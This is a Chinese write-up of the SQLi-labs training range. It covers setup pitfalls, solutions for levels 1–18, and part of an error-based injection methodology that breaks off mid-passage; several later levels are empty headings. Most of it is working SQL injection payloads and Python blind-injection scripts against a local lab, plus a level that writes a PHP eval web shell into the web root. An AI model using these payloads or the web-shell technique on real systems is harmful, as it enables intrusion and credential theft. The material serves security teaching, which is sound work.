# SQL注入

# §1 SQLi-lab

[SQLI labs](https://github.com/Audi-1/sqli-labs)是一个基于PHP和MySQL的开源SQL注入靶场。本节介绍各个安装流程和常踩的坑。

## §1.1



## §1.2 注意事项

## 

### §1.2.1 `mysql`和`mysqli`

在初始化数据库时，即使已经启用了`php_mysql.dll`扩展，可能仍然会遇到找不到`mysql_connect()`的报错：

```
PHP Fatal error: Uncaught Error: Call to undefined function mysql_connect()
```

根据[PHP官方文档](https://www.php.net/manual/en/function.mysql-connect.php)，从PHP 5.5.0版本起，`php_mysql.dll`扩展将被弃用，取而代之的是`php_mysqli.dll`和`php_pdo_mysql.dll`。而该靶场使用的函数定义于被弃用的扩展中，所以会报错。要么把所有`mysql_`开头的函数全部替换成`mysqli_`，要么回退到PHP旧版本。

### §1.2.2 魔法引号

PHPStudy在`php.ini`中默认开启了魔法引号功能，该功能可以在GET/POST/COOKIE中的所有单引号、双引号、反斜杠、`\0`NULL字符之前加上反斜杠进行转义。该靶场的payload都基于这些特殊字符，因此一定要关闭该功能。

```ini
; Magic quotes for incoming GET/POST/Cookie data.
magic_quotes_gpc = Off
```

### §1.2.3 HackBar吞空格

众所周知，SQL语句的注释符`--`后面必须加一个空格，才能后接注释文本，否则该注释无效，并引起报错。而HackBar这款浏览器插件好死不死的吞末尾空格，导致你必须给`GET`请求的参数后手动添加一个UrlEncode空格字符`%20`才行。

### §1.2.4 Url编码`+`被替换为空格

根据[这篇StackOverflow问题下的回答](https://stackoverflow.com/questions/1005676/does-a-in-a-url-scheme-host-path-represent-a-space)，在历史上，Url编码规则经历了多个不同的标准：

- 在[RFC-1738](https://www.ietf.org/rfc/rfc1738.txt)标准中，为防止`&`等特殊字符干扰参数值导致二义性，需要将其准换成`%hh`形式。但是该标准本身没有提到如何处理`+`这一字符。[HTML 401](https://www.w3.org/TR/html401/)标准的[§17.13.4 Form content types](https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4.1)一节中进行了补充，特别说明**空格被编码成`+`**。

  > <center>application/x-www-form-urlencoded</center>
  >
  > This is the default content type. Forms submitted with this content type must be encoded as follows:
  > `x-www-form-urlencoded`是默认使用的内容格式，使用这种格式提交的内容必须符合以下编码规则：
  >
  > 1. Control names and values are escaped. Space characters are replaced by `+`, and then reserved characters are escaped as described in `RFC1738`, section 2.2:...
  >    控制字符必须经过转义。**空格字符应被替换为`+`**，其余的保留字符应按照`RFC1738`2.2节的标准进行转义：...
  > 2. ...

- 在[RFC-3986](https://www.rfc-editor.org/rfc/rfc3986#section-2.4)标准中，所有可能产生二义性的字符都必须被强制转义，包括空格。

  > <center>2.4 When to Encode or Decode</center>
  >
  > When a URI is dereferenced, the components and subcomponents significant to the scheme-specific dereferencing process (if any) must be parsed and separated before the percent-encoded octets within those components can be safely decoded, as otherwise the data may be mistaken for component delimiters.
  > 在该标准规定的解码流程中，当URI被解码时，如果存在干扰该流程的组件与子组件，那么这些组件与子组件必须经过转换，从而与真正的分隔符区分开来，然后才能保证Url编码不会造成二义性，否则这些组件与子组件可能被误认为是组件分割符。

根据PHP的关于[超全局变量`$_GET[]`](https://www.php.net/manual/zh/reserved.variables.get.php)和[函数`urlencode()`](https://www.php.net/manual/zh/function.urldecode.php)的官方文档，`$_GET[]` 是通过`urldecode()`传递的，而该函数执行的恰好是`RFC-1738`标准，会将`+`替换为空格。另有`rawurldecode()`函数执行的是`RFC-3986`标准。

> <center>$_GET</center>
>
> 注意:GET是通过[urldecode()](https://www.php.net/manual/zh/function.urldecode.php)传递的。
>
> <center>urldecode()</center>
>
> 解码给出的已编码字符串中的任何 `%##`。加号（`+`）被解码成一个空格字符。
>
> <center>rawurldecode()</center>
>
> 注意:`rawurldecode()`不会把加号（`+`）解码为空格，而`urldecode()`可以。
>

### §1.2.5 SQL中的`'`与`''`

SQL中的字符串两侧可以用单引号或双引号。当使用单引号时，如果字符串中还包含单引号，就会引起二义性：

```sql
SELECT * FROM ... WHERE title='I'm a CTFer';
```

这时，我们应该给字符串中的单引号进行转义，变成`''`的形式：

```sql
SELECT * FROM ... WHERE title='I''m a CTFer';
```

????????????????????[四种方式](https://www.databasestar.com/sql-escape-single-quote/)

### §1.2.6 SQL的括号/引号嵌套

| 外层\payload |      |      |      |      |      |
| ------------ | ---- | ---- | ---- | ---- | ---- |
|              |      |      |      |      |      |
| ''           |      |      |      |      |      |
| ""           |      |      |      |      |      |
| ''''         |      |      |      |      |      |
| """"         |      |      |      |      |      |
| ()           |      |      |      |      |      |
| ('')         |      |      |      |      |      |
| ("")         |      |      |      |      |      |
| '()'         |      |      |      |      |      |
| "()"         |      |      |      |      |      |
|              |      |      |      |      |      |

### §1.2.7 MySQL的`secure_file_priv`参数

根据[官方文档](en/server-system-variables.html#sysvar_secure_file_priv)，`secure_file_priv`是一个系统级的全局变量，负责控制SQL语句与文件系统交互的权限：

> - `secure_file_priv`
>
>   `secure_file_priv` 的取值有以下情形
>
>   - 如果为空字符串，则该变量无效（可以任意导入导出），风险很高。
>   - 如果为一个目录的路径，则只允许向该目录导入导出。该目录必须预先存在，MySQL不负责创建目录。
>   - 如果为`NULL`，则禁止所有导入导出。

这一变量影响`select ... into outfile/dumpfile`、`load_data()`、`load_file()`等函数。





## §1.3 题解

### §1.3.1 第1关 绕过`''`

我们以这行代码入手：

```php
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

显然，`$id`中若含有单引号便可实现逃逸的效果，比如最经典的`1' or '1'='1`。

了解后，我们假装不知道源代码，开始逐步构建payload，猜测语句结构。

首先试一下正常输入，均正常：

```sql
id=1		-- Login name: Dumb		Password: Dumb
id=2		-- Login name: Angelina	Password: I-kill-you
id=1000		-- Login name: 			Password:
```

尝试单引号，报错；尝试两个单引号，正常。可以猜测语句中肯定包含单引号。同时`LIMIT`告诉我们最多输出一条结果。

```sql
id=1		-- Login name: Dumb		Password: Dumb
id=1'		-- You have an error in your SQL syntax; ... near ''1'' LIMIT 0,1' at line 1
id=1''		-- Login name: Dumb		Password: Dumb
```

知道语句包含单引号后，我们就可以猜测语句大概如下所示：

```sql
SELECT ? FROM ? WHERE ?='$id' LIMIT 0,1 ? ;
```

接下来使用`ORDER BY`爆列数，同时使用`--`注释掉`LIMIT`语句，得到列数为3：

```sql
id=1 ORDER BY 1 --  (一定要在--后面加空格,才能识别为有效的注释)
=> SELECT ? FROM ? WHERE ?='   1' ORDER BY 1 --   ' LIMIT 0,1 ? ;
=> SELECT ? FROM ? WHERE ?='1' ORDER BY 1;
			-- Login name: Dumb		Password: Dumb
id=1‘ ORDER BY 2 -- 
=> SELECT ? FROM ? WHERE ?='   1' ORDER BY 2 --   ' LIMIT 0,1 ? ;
=> SELECT ? FROM ? WHERE ?='1' ORDER BY 2;
			-- Login name: Dumb		Password: Dumb
id=1‘ ORDER BY 3 -- 
=> SELECT ? FROM ? WHERE ?='   1' ORDER BY 3 --   ' LIMIT 0,1 ? ;
=> SELECT ? FROM ? WHERE ?='1' ORDER BY 3;
			-- Login name: Dumb		Password: Dumb
id=1‘ ORDER BY 4 -- 
=> SELECT ? FROM ? WHERE ?='   1' ORDER BY 4 --   ' LIMIT 0,1 ? ;
=> SELECT ? FROM ? WHERE ?='1' ORDER BY 4;
			-- Unknown column '4' in 'order clause'
```

利用`SELECT 1,2,3`建一张列数同样为3的新表，使用`UNION`语句爆字段与列序的关系。虽然注释了`LIMIT`，但是前端始终只显示一条记录，因此我们还要在`WHERE`中设置一个自相矛盾的条件，来把正常的那条记录给干掉，只留下我们的创建的新表：

```sql
id=1' union select 1,2,3 -- 
=> SELECT * FROM users WHERE id='1' union select 1,2,3 -- ' LIMIT 0,1
			+----+----------+----------+
			| id | ???????? | ???????? |
			+----+----------+----------+
			|  1 | Dumb     | Dumb     |
			|  1 | 2        | 3        |
			+----+----------+----------+
			-- Login name: Dumb		Password: Dumb
id=2' and 1=2 union select 1,2,3 -- 
=> SELECT * FROM users WHERE id='2' and 1=2 union select 1,2,3 -- ' LIMIT 0,1
			+----+----------+----------+
			| id | ???????? | ???????? |
			+----+----------+----------+
			|  1 | 2        | 3        |
			+----+----------+----------+
			-- Login name: 2		Password: 3
			可知第二列与用户名相关,第三列与密码相关
```

用`database()`函数爆当前SQL语句执行的数据库名：

```sql
id=1' AND 1=2 UNION SELECT 1,DATABASE(),3 --+
=> SELECT * FROM users WHERE id='1' AND 1=2 UNION SELECT 1,DATABASE(),3 -- ' LIMIT 0,1
			-- Login name: security	Password: 3
			可知当前数据库名为security
```

用`information_schema`数据库中的`schemata`表爆所有数据库名，果然存在之前爆出的`security`：

```sql
id=1' AND 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 -- 
=> SELECT * FROM users WHERE id='1' AND 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 -- ' LIMIT 0,1
			+----+----------------------------------------------------------------------+----------+
			| id | ????????                                                             | ???????? |
			+----+----------------------------------------------------------------------+----------+
			|  1 | information_schema,challenges,mysql,performance_schema,security,test | 3        |
			+----+----------------------------------------------------------------------+----------+
			-- Login name: information_schema,challenges,mysql,performance_schema,security,test		Password: 
```

用`information_schema`数据库中的`tables`表爆`security`数据库的所有表名：

```sql
id=1' AND 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 -- 
=> SELECT * FROM users WHERE id='1' AND 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 -- ' LIMIT 0,1
			-- Login name: emails,referers,uagents,users	-- Password: 3
```

猜测`users`表存放着用户数据。用`information_schema`数据库中的`columns`表，爆`security`数据库中`users`表的所有列名：

```sql
id=1' AND 1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'),3 --+
=> SELECT * FROM users WHERE id='1' AND 1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'),3 -- ' LIMIT 0,1
			-- Login name: id,username,password		-Password: 3
```

根据列名爆全表：

```sql
id=1' AND 1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(username) FROM security.users),(SELECT GROUP_CONCAT(password) FROM security.users) --+
SELECT * FROM users WHERE id='1' AND 1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(username) FROM security.users),(SELECT GROUP_CONCAT(password) FROM security.users) -- ' LIMIT 0,1
			-- Login name: Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
			-- Password: Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
```

### §1.3.2 第2关 不绕过

先按正常流程试一遍：

- `id=1`，正常
- `id=1'`，报错，`Wrong syntax near '' LIMIT 0,1' at line 1`
- `id=1''`，报错，`Wrong syntax near ''' LIMIT 0,1' at line 1`

至此可推断，SQL语句肯定没有形如`'id'`的部分，而是直接将`id`暴露在外。只需将第1关中的payload从`id=1'`改为`id=1`即可，其余步骤同上。

### §1.3.3 第3关 绕过`('')`

先按正常流程试一遍：

- `id=1`，正常
- `id=1'`，报错，`Wrong syntax near ''1'') LIMIT 0,1' at line 1`
- `id=1''`，正常

因为两个单引号正常，所以一定有``''`。容易发现，相比与第2关，单引号报错多了一个右括号。将`1'`看作一个整体，报错信息给出的部分语句形如`'$id') LIMIT 0,1`，立即可以推测出语句为`WHERE ?=('$id')`。只需将第1关中的payload从`id=1'`改为`id=1')`即可，其余步骤同上。

### §1.3.4 第4关 绕过`("")`

先按正常流程试一遍：

- `id=1`，正常
- `id=1'`，正常
- `id=1''`，正常

再试一下双引号：

- `id=1"`：报错，`Wrong syntax to use near '"1"") LIMIT 0,1' at line 1`
-  `id=1""`：正常

类比于第3关，报错信息给出的部分语句形如`"$id") LIMIT 0,1`。只需将第1关中的payload从`id=1'`改为`id=1")`即可，其余步骤同上。

### §1.3.5 第5关 报错注入（绕过`''`）

报错有回显先按正常流程试一遍：

- `id=1`，正常
- `id=1'`，报错，`Wrong syntax to use near ''1'' LIMIT 0,1' at line 1`
- `id=1' --+`，正常
- `id=1"`，正常

据此可推测，SQL语句形如`'$id' LIMIT 0,1`。

`ORDER BY`爆列数为3：

```sql
id=1' ORDER BY 3 --+
=> SELECT ? FROM ? WHERE ID='1' ORDER BY 3 -- ' LIMIT 0,1
		# You are in...........
id=1' ORDER BY 4 --+
=> SELECT ? FROM ? WHERE ID='1' ORDER BY 4 -- ' LIMIT 0,1
		# Unknown column '4' in 'order clause'
```

尝试`SELECT`爆字段与列序的关系，结果未返回任何一个期望值，这说明返回值与数据库无关，是一个写死的值：

```sql
id=1’ and 1=2 union select 1,2,3 --+
		# You are in...........	(不是1,2,3种的任何一个)
```

这种情况下，输出正常只能告诉我们语句执行成功，不能输出我们想要的信息，只能通过输出报错了。

1. 解法一 双查询注入

   以下步骤的原理详见[§3.1.1 主键重复注入](#§3.1.1 主键重复注入)一节。

   爆数据库名：

   ```sql
   id=1' union select 1,count(*), concat((select database()), floor(rand(14)*2))as a from information_schema.tables group by a --+
   	Duplicate entry 'security0' for key 'group_key' # 我们构建的恶意payload:database()得到了执行.
   ```

   爆表名：

   ```sql
   ?id=1' union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
   	Duplicate entry 'emails1' for key 'group_key'
   
   ?id=1' union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 1,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
   	Duplicate entry 'referers1' for key 'group_key'
   
   ?id=1' union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 2,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
   	Duplicate entry 'uagents1' for key 'group_key'
   
   ?id=1' union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
   	Duplicate entry 'users1' for key 'group_key'
   
   ?id=1' union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 4,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
   	The used SELECT statements have a different number of columns
   ```

   爆列名：

   ```sql
   ?id=1' union select 1 from (select count(*),concat((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' LIMIT 0,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
   	Duplicate entry 'id1' for key 'group_key' # 列名为id
   
   ?id=1' union select 1 from (select count(*),concat((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' LIMIT 1,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
   	Duplicate entry 'username1' for key 'group_key' # 列名为username
   	
   ?id=1' union select 1 from (select count(*),concat((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' LIMIT 2,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
       Duplicate entry 'password1' for key 'group_key' # 列名为password
       
   ?id=1' union select 1 from (select count(*),concat((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' LIMIT 3,1),floor(rand(0)*2))x from information_schema.schemata group by x)y --+
       The used SELECT statements have a different number of columns # 未报错，说明子查询返回了空表，说明列名已经爆完
   ```

   爆数据：

   ```sql
   ?id=1' union select 1 from (select count(*),concat((SELECT username FROM users LIMIT 0,1),floor(rand(0)*2))x from users group by x)y --+
   	Duplicate entry 'Dumb1' for key 'group_key'
   ```

2. 解法二 XPath注入

   以下步骤的原理详见[3.1.2 XPath注入](#3.1.2 XPath注入)。

   爆数据库名：

   ```sql
   payload = ?id=1' and extractvalue('',concat(0x30,(select database())))--+
   	XPATH syntax error: 'security'
   ```

   爆表名：

   ```sql
   payload = ?id=0' and extractvalue(0x0a,concat(0x30,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+
   	XPATH syntax error: 'emails,referers,uagents,users'
   ```

   爆列名：

   ```sql
   payload = ?id=0' and extractvalue(0x0a,concat(0x0a,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'))) --+
   	XPATH syntax error: 'id,username,password'
   ```

   爆记录：

   ```sql
   payload = ?id=0' and extractvalue(0x0a,concat(0x0a,(SELECT GROUP_CONCAT(username) FROM users ))) --+
   	XPATH syntax error: 'Dumb,Angelina,Dummy,secure,stup' (32字符限制)
   ```

### §1.3.6 第6关 报错注入（绕过`""`）

经过简单测试可知参数由一层双引号包围，无成功回显，有报错回显，剩余步骤与第5关一样。

### §1.3.7 第7关 导出数据库

本题无成功回显，无错误回显。通过穷举可知包含方式为`((''))`，`ORDER BY `爆列数为3。尝试输入正常数据`id=1`，得到`You are in.... Use outfile......`，提示我们使用`outfile`语句。

构造PHP WebShell：

```
<?php @eval($_POST['shell']); ?>
```

将其转化为16进制，在前面加上前导`0x`：

```
0x3c3f70687020406576616c28245f504f53545b277368656c6c275d293b203f3e
```

使用全局变量`@@datadir`查看MySQL安装路径，使用`@@basedir`查看数据库路径。这里我们盲猜PHP路径为`/var/www/html`：

```
?id=1')) union select null,0x3c3f70687020406576616c28245f504f53545b277368656c6c275d293b203f3e,null into outfile '/var/www/html/shell.php' --+
```

### §1.3.8 第8关 布尔盲注

本题成功无回显，错误无回显，穷举可知包含方法为`''`，`ORDER BY`爆列数为3。

参考[§3.3.1 布尔盲注（Boolean Based）](#§3.3.1 布尔盲注（Boolean Based）)一节的脚本——

爆数据库名：

```python
import requests

MAX_FILED_LENGTH = 20
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"

def getBinarySearchResult(url: str, paramRange: list[int], successInfo: str) -> int:
	......

databaseNameLength = getBinarySearchResult(
    URL_PREFIX + "?id=1' and length(database())>{} --+",
    [1, MAX_FILED_LENGTH],
    "You are in..........."
)
print("数据库名的长度为{}位".format(databaseNameLength))

databaseName = ""
for i in range(1, databaseNameLength+1):
    databaseName += chr(getBinarySearchResult(
        URL_PREFIX + "?id=1' and ascii(substr((select database())," + str(i) + ",1)) > {} --+",
        [0, 128],
        "You are in..........."
    ))
    print(databaseName)
```

```shell
C:\> python writeup.py
    数据库名的长度为8位
    s
    se
    sec
    secu
    secur
    securi
    securit
    security
```

爆表名：

```python
import requests

MAX_FILED_LENGTH = 40
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"


def getBinarySearchResult(url: str, paramRange: list[int], successInfo: str) -> int:
	......

databaseName = "security"
columnsName = ""
for i in range(1,MAX_FILED_LENGTH+1):
    columnsName += chr(getBinarySearchResult(
        URL_PREFIX + "?id=1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),"+str(i)+",1)) > {} --+",
        [0,127],
        "You are in..........."
    ))
    print(columnsName)
```

```shell
C:/> python writeup.py
    e
    em
    ema
	......
    emails,referers,uagents,user
    emails,referers,uagents,users
```

爆列名：

```python
import requests

MAX_FILED_LENGTH = 40
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"

def getBinarySearchResult(url: str, paramRange: list[int], successInfo: str) -> int:
	......

databaseName = "security"
columnsName = ""
for i in range(1,MAX_FILED_LENGTH+1):
    columnsName += chr(getBinarySearchResult(
        URL_PREFIX + "?id=1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),"+str(i)+",1)) > {} --+",
        [0,127],
        "You are in..........."
    ))
    print(columnsName)
```

```shell
C:\> python writeup.py
    i
    id
    id,
	......
    id,username,passwor
    id,username,password
```

爆数据：

```python
    ......
    columnsName += chr(getBinarySearchResult(
        URL_PREFIX + "?id=1' and ascii(substr((select group_concat(username) from security.users),"+str(i)+",1)) > {} --+",
        [0,127],
        "You are in..........."
    ))
    ......
```

```shell
C:\> python writeup.py
    D
    Du
    Dum
    ......
    Dumb,Angelina,Dummy,secure,stupid,super
    Dumb,Angelina,Dummy,secure,stupid,superm
```

### §1.3.9 第9关 时间盲注（绕过`''`）

本题成功失败均无回显，而且无明显区分标志，故考虑使用时间盲注。

> 注意：受制于网络环境的通信质量，可能需要延长`SLEEP_TIME`参数，导致我们不得不延长程序爆破的时间。

爆数据库名：

```python
import requests
import time

MAX_FILED_LENGTH = 40
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"
SLEEP_TIME = 0.5

def getBinarySearchResultByTime(url: str, paramRange: list[int], sleepTime: float)->int:
	......

databaseNameLength = getBinarySearchResultByTime(
    URL_PREFIX + "?id=1' and if(length(database()) > {}, sleep("+str(SLEEP_TIME)+"), 1)+ --+",
    [0,128],
    SLEEP_TIME
)
print("{}".format(databaseNameLength))

databaseName = ""
for i in range(1, databaseNameLength+1):
    databaseName += chr(getBinarySearchResultByTime(
        URL_PREFIX + "?id=1' and if(ascii(substr((select database())," + str(i) + ",1)) > {},sleep("+str(SLEEP_TIME)+"),1) --+",
        [0, 128],
        SLEEP_TIME
    ))
    print(databaseName)
```

```shell
C:\> python writeup.py
    8
    s
    se
    sec
    secu
    secur
    securi
    securit
    security
```

爆表名：

```python
import requests
import time

MAX_FILED_LENGTH = 40
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"
SLEEP_TIME = 0.5

def getBinarySearchResultByTime(url: str, paramRange: list[int], sleepTime: float)->int:
	......

columnsName = ""
for i in range(1, MAX_FILED_LENGTH+1):
    columnsName += chr(getBinarySearchResultByTime(
        URL_PREFIX + "?id=1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(i) + ",1)) > {},sleep("+str(SLEEP_TIME)+"),1) --+",
        [0, 128],
        SLEEP_TIME
    ))
    print(columnsName)
```

```
C:\> python writeup.py
    e
    em
    ......
    emails,referers,uagents,user
    emails,referers,uagents,users
```

爆列名：

```python
import requests
import time

MAX_FILED_LENGTH = 40
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"
SLEEP_TIME = 0.5

def getBinarySearchResultByTime(url: str, paramRange: list[int], sleepTime: float)->int:
	......

columnsName = ""
for i in range(1, MAX_FILED_LENGTH+1):
    columnsName += chr(getBinarySearchResultByTime(
        URL_PREFIX + "?id=1' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users')," + str(i) + ",1)) > {},sleep("+str(SLEEP_TIME)+"),1) --+",
        [0, 128],
        SLEEP_TIME
    ))
    print(columnsName)
```

```shell
C:\> python writeup.py
    i
    id
    id,
    ......
    id,username,passwor
    id,username,password
```

爆数据：

```python
import requests
import time

MAX_FILED_LENGTH = 40
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"
SLEEP_TIME = 0.5

def getBinarySearchResultByTime(url: str, paramRange: list[int], sleepTime: float)->int:
	......

columnsName = ""
for i in range(1, MAX_FILED_LENGTH+1):
    columnsName += chr(getBinarySearchResultByTime(
        URL_PREFIX + "?id=1' and if(ascii(substr((select group_concat(username) from security.users)," + str(i) + ",1)) > {},sleep("+str(SLEEP_TIME)+"),1) --+",
        [0, 128],
        SLEEP_TIME
    ))
    print(columnsName)
```

```shell
C:\> python writeup.py
    D
    Du
    ......
    Dumb,Angelina,Dummy,secure,stupid,super
    Dumb,Angelina,Dummy,secure,stupid,superm
```

### §1.3.10 第10关 时间盲注（绕过`""`）

重复第9关步骤，发现不成功，转而穷举包含方式，最终确定为`""`，剩余步骤与第9关相同。

### §1.3.11 第11关 登录界面错误注入（绕过`''`）

该登录界面有两个参数：`passwd`与`uname`，经实测均有错误回显，没有正确回显，包含方式均为`''`，`ORDER BY`爆列数为2。随便选一种错误注入即可，剩余步骤与第5关相同。

### §1.3.12 第12关 登录界面错误注入（绕过`("")`）

一开始以为是`''`，发现无报错回显，尝试时间盲注也不行。后来一看源码才知道包含方式是`("")`，而且有报错回显。剩下步骤与第11关相同。

### §1.3.13 第13关 登录界面报错注入（绕过`('')`）

穷举各种包含方法，得知包含方法为`('')`，且报错有回显。剩余步骤与第5关相同。

### §1.3.14 第14关 登录界面报错注入（绕过`""`）

穷举各种包含方法，得知包含方法为`""`，且报错有回显。剩余步骤与第5关相同。

### §1.3.15 第15关 登录界面盲注（绕过`''`）

正误特征有差别，但报错无回显。构造POST的Payload`passwd=456' or '1'='1&uname=123' or 1=1 --+`发现登录成功，说明包含方式为`''`。接下来随便选一种盲注方式即可。

### §1.3.16 第16关 登录界面盲注（绕过`("")`）

与第15关类似，经过穷举可知包含方式为`("")`，以下略。

### §1.3.17 第17关 错误注入（使用`UPDATE`）

此题的难点在于“乍一看”所有操作的回显都完全一致，因为无论是`'`/`""`还是随便输入一个不可能存在的超长用户名，返回的结果均一致。由更改密码这一功能可知SQL语句使用的是`UPDATE`子句，语法类似于`UPDATE 表名 SET 列名=新密码 WHERE 列名=用户名`。因此如果我们真的想让这一SQL语句发挥作用，我们就必须事先知道这个表中的用户名都有哪些。猜对用户名的概率微乎其微，所以我们得到的回显都是失败或报错的回显。幸好这里有个弱用户名`admin`可以猜，但是剩下的思路都行不通了。

无奈审计源码：

```php
include("../sql-connections/sql-connect.php");
error_reporting(0);
function check_input($value){
	if(!empty($value)){
		$value = substr($value,0,15);
	}

	if (get_magic_quotes_gpc()){
		$value = stripslashes($value);
	}

	if (!ctype_digit($value)){
		$value = "'" . mysql_real_escape_string($value) . "'";
	}else{
		$value = intval($value);
	}
	return $value;
}


if(isset($_POST['uname']) && isset($_POST['passwd'])){
    $uname=check_input($_POST['uname']);  
    $passwd=$_POST['passwd'];
    @$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";
    $result=mysql_query($sql);
    $row = mysql_fetch_array($result);
    if($row){
            $row1 = $row['username'];  	
            $update="UPDATE users SET password = '$passwd' WHERE username='$row1'";
            mysql_query($update);
            if (mysql_error()){
                print_r(mysql_error());
            }else{
                echo " You password has been successfully updated " ;		
            }
        }else{
            echo "Bug off you Silly Dumb hacker";
        }
}
```

从以上源码中我们注意到：

- `$_POST['uname']`字段被转义，无法注入
- 必须先确保`SELECT username, password FROM users WHERE username= $uname LIMIT 0,1`能返回值，然后才能通过`UPDATE users SET password = '$passwd' WHERE username='$row1'`注入
- 满足以上两点的情况下，可以通过`print_r(mysql_error())`报错注入

综上所述，我们对`$_POST['passwd']`字段进行报错注入，Payload为：

```
uname=admin&passwd=admin' and extractvalue(0x0a,concat(0x0a,(SELECT语句))) and '1'='1
```

以下步骤略。

### §1.3.18 第18关 错误注入（使用User-Agent）

审计源码：

```php
$sql = "SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
			$result1 = mysql_query($sql);
				$row1 = mysql_fetch_array($result1);
$insert = "INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
```



### §1.3.19 第19关

### §1.3.20 第20关

### §1.3.21 第21关

### §1.3.22 第22关

### §1.3.23 第23关

### §1.3.24 第24关

### §1.3.25 第25关

# §3 SQL注入方法论

## §3.1 错误注入（Error Based）

> 注意：[MySQL源码](https://github.com/mysql/mysql-server/blob/3e90d07c3578e4da39dc1bce73559bbdf655c28c/mysys/my_error.cc)中的`ERRMSGSIZE`限制了错误信息的长度。
>
> ```c++
> /* Max length of a error message. Should be kept in sync with MYSQL_ERRMSG_SIZE.
>  */
> #define ERRMSGSIZE (512)
> ```

### §3.1.1 主键重复注入

子查询的格式是`(SELECT (payload))`，该语句的作用相当于创建一张新表，可以根据将payload解析为字段名或表达式，MySQL对其计算后返回相应的计算值。

```sql
SELECT CONCAT((SELECT 1+1));
			+----------------------+
			| CONCAT((SELECT 1+1)) |
			+----------------------+
			| 2                    |
			+----------------------+
```

同理，我们可以给payload传MySQL内置的各类函数：

```sql
SELECT CONCAT((SELECT DATABASE()));
			+-----------------------------+
			| CONCAT((SELECT DATABASE())) |
			+-----------------------------+
			| security                    |
			+-----------------------------+
SELECT CONCAT(
    	(
            SELECT GROUP_CONCAT(TABLE_NAME) 
   			FROM INFORMATION_SCHEMA.TABLES
   			WHERE TABLE_SCHEMA='security'
        )
	)
	AS something;
			+-------------------------------+
			| something                     |
			+-------------------------------+
			| emails,referers,uagents,users |
			+-------------------------------+
```

2016年，一位用户发现并提交了MySQL中[RAND()引发的运行时错误](https://bugs.mysql.com/bug.php?id=82544)，**只要`count()`、`group by`/`order by`、`rand()`**三者一起用就有几率报错，官方确认后将其写入到[官方文档](https://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_rand)中：

> Use of a column with RAND() values in an ORDER BY or GROUP BY clause may yield unexpected results because for either clause a RAND() expression can be evaluated multiple times for the same row, each time returning a different result.
> 如果在`ORDER BY`或`GROUP BY`子句中使用的列名含有`RAND()`函数的表达式，则可能会输出不可预料的结果。这是因为对于同一行而言，每个由`rand()`表达式多次取值得到的子句都会返回不同的值。

官方文档的解释比较粗略，一篇来自先知社区的博文[MYSQL报错注入的一点总结](https://xz.aliyun.com/t/253)的解释如下：

> 以`SELECT count(*) FROM users GROUP BY username`这一SQL语句为例，`group by`子句需要某个表达式作为分组的依据，对每一行都需要运行一次该表达式——如果该表达式的值没有出现在临时表中，则向临时表中创建这一行‘如果已经出现在临时表中，则令`count(*)`自增`1`：
>
> ```
> mysql> select * from users;
> +------+-----------+
> | id   | username  |
> +------+-----------+
> | 0    | jack      |
> | 1    | jack      |
> | 2    | tom       |
> +------+-----------+
> ```
>
> 1. 执行`SELECT count(*) FROM users GROUP BY username`，首先MySQL会创建一张临时表：
>
>    | `username`(主键) | `count(*)` |
>    | ---------------- | ---------- |
>
> 2. 接着读取`users`表的第一行，执行`username`表达式，得到值`jack`，发现临时表的主键中没有`jack`这一项，于是创建一行：
